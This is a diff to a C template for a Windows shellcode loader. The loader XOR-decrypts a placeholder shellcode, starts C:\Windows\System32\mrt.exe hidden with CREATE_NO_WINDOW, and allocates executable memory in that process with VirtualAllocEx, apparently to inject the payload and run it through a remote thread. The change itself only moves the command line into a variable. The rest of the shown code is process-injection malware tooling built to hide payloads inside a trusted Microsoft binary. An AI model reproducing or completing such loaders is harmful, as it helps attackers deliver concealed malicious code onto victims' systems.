@@ -13,6 +13,7 @@ VOID entry(void)
     HANDLE remote_thread_handle = INVALID_HANDLE_VALUE;
     PVOID base_address = INVALID_HANDLE_VALUE;
 	SIZE_T bytes_written = 0;
+	LPSTR cmdline;
 
     STARTUPINFOA si = {0};
     PROCESS_INFORMATION pi = {0};
@@ -25,7 +26,9 @@ VOID entry(void)
 	{{ SHELLCODE }}
 	decrypt_xor(shellcode, sizeof(shellcode), key, sizeof(key));
 
-    CreateProcessA(NULL, "C:\\Windows\\System32\\mrt.exe", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+	cmdline = "C:\\Windows\\System32\\mrt.exe";
+
+    CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
 
     base_address = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
     if (base_address == INVALID_HANDLE_VALUE) return;
